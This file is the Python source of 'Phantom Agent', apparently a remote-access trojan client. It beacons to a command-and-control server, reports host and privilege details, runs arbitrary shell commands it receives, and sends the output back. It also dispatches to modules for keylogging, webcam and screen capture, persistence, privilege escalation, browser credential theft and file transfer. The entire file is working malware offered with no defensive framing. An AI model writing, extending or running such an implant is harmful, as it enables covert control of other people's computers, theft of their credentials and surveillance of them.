"""Phantom Agent — stdlib only, poll-based C2 beacon."""
import os, sys, json, time, platform, socket, subprocess, base64, traceback
from urllib.request import Request, urlopen
from urllib.parse import urlencode

C2_URL = None
POLL_INTERVAL = 5
AGENT_ID = None

HEARTBEAT_INTERVAL = 30
last_heartbeat = 0

MODULE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'modules')
MODULE_REGISTRY = {}
if os.path.isdir(MODULE_DIR):
    for name in os.listdir(MODULE_DIR):
        path = os.path.join(MODULE_DIR, name)
        if path.endswith('.py') and not name.startswith('_'):
            mod_name = name[:-3]
            try:
                spec_hint = None
                if mod_name == 'recon':
                    spec_hint = {'info': []}
                # import the module by path
                import importlib.util
                spec = importlib.util.spec_from_file_location(mod_name, path)
                if spec is None:
                    continue
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                MODULE_REGISTRY[mod_name] = mod
            except Exception:
                pass

def send(path, payload):
    try:
        data = json.dumps(payload).encode('utf-8', errors='replace')
        req = Request(C2_URL + path, data=data, headers={'Content-Type': 'application/json'})
        with urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {'error': str(e)}

def register():
    global AGENT_ID
    payload = {
        'hostname': platform.node(),
        'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system() + ' ' + platform.release(),
        'arch': platform.machine(),
        'privileges': 'admin' if os.name == 'nt' else 'root' if hasattr(os, 'geteuid') and os.geteuid() == 0 else 'user',
        'pid': os.getpid()
    }
    result = send('/register', payload)
    if isinstance(result, dict) and 'id' in result:
        AGENT_ID = result['id']
    else:
        AGENT_ID = 'phantom-' + platform.node()

def run_shell(args):
    try:
        cmd = args[0] if args else 'whoami'
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60, text=True, errors='replace')
        return {'output': out, 'type': 'shell'}
    except subprocess.CalledProcessError as e:
        return {'output': e.output, 'error': str(e), 'type': 'shell'}
    except Exception as e:
        return {'output': '', 'error': str(e), 'type': 'shell'}

def run_recon(_):
    import socket, os
    info = {
        'hostname': platform.node(),
        'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system() + ' ' + platform.release(),
        'arch': platform.machine(),
        'privileges': 'admin' if os.name == 'nt' else 'root' if hasattr(os, 'geteuid') and os.geteuid() == 0 else 'user',
        'pid': os.getpid(),
        'cwd': os.getcwd(),
        'ip': socket.gethostbyname(socket.gethostname()) if socket.gethostname() else 'unknown'
    }
    return {'output': json.dumps(info, indent=2), 'type': 'recon'}

MODULE_HANDLERS = {
    'shell': run_shell,
    'recon': run_recon,
}

def execute(cmd):
    c = cmd.get('cmd')
    if c == 'module':
        name = cmd.get('module')
        args = cmd.get('args', [])
        data = cmd.get('data') or {}
        if not args:
            args = [data.get(x, '') for x in ['command','path','source','target','method','url','query','duration_seconds'] if data.get(x)]
        # first try registry
        handler = getattr(MODULE_REGISTRY.get(name), 'run', None)
        if handler:
            try:
                if isinstance(args, dict):
                    return handler(args)
                # map positional args based on module
                if name == 'shell' and args:
                    return handler({'command': args[0]})
                if name == 'files':
                    return handler({'action': args[0] if args else 'list', 'path': args[1] if len(args) > 1 else '.', 'query': args[1] if len(args) > 1 else ''})
                if name == 'screenshot':
                    return handler({})
                if name == 'keylogger':
                    return handler({'duration_seconds': args[0] if args else 10})
                if name == 'webcam':
                    return handler({})
                if name == 'persist':
                    return handler({'method': args[0] if args else 'registry'})
                if name == 'elevate':
                    return handler({'method': args[0] if args else 'auto'})
                if name == 'creds':
                    return handler({'target': args[0] if args else 'browser'})
                if name == 'upload':
                    return handler({'source': args[0] if args else '', 'destination': args[1] if len(args) > 1 else '/tmp/uploaded'})
                if name == 'download':
                    return handler({'source': args[0] if args else '/etc/hostname'})
                return handler({k: v for k, v in zip(['command','path','source','target','method'], args)})
            except Exception as e:
                return {'output': '', 'error': str(e), 'type': name}
        # fallback
        return {'status': f'module {name} unavailable', 'type': name}
    if c == 'shell':
        return run_shell(cmd.get('args', ['whoami']))
    if c == 'recon':
        return run_recon(cmd.get('args', []))
    return {'status': 'ok', 'type': 'unknown', 'command': c}

def poll():
    global AGENT_ID, last_heartbeat
    if not AGENT_ID:
        register()
    while True:
        try:
            now = time.time()
            if now - last_heartbeat >= HEARTBEAT_INTERVAL:
                send('/heartbeat', {'id': AGENT_ID})
                last_heartbeat = now
            req = Request(C2_URL + f'/api/agent/{AGENT_ID}/poll')
            with urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            cmds = data.get('commands', {})
            if cmds:
                keys = list(cmds.keys())
                keys.sort()
                for cid in keys:
                    c = cmds[cid]
                    result = execute(c)
                    result['received_at'] = time.time()
                    result['agent'] = AGENT_ID
                    send(f'/api/agent/{AGENT_ID}/result/{cid}', result)
                    time.sleep(0.2)
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == '__main__':
    for a in sys.argv[1:]:
        if a == '--c2' or a == '--poll':
            continue
        pass
    if '--c2' in sys.argv:
        idx = sys.argv.index('--c2')
        C2_URL = sys.argv[idx + 1]
    else:
        C2_URL = os.environ.get('C2_URL', 'http://localhost:8080').rstrip('/')
    if '--poll' in sys.argv:
        idx = sys.argv.index('--poll')
        POLL_INTERVAL = int(sys.argv[idx + 1])
    else:
        POLL_INTERVAL = int(os.environ.get('POLL_INTERVAL', 5))
    register()
    try:
        poll()
    except KeyboardInterrupt:
        sys.exit(0)
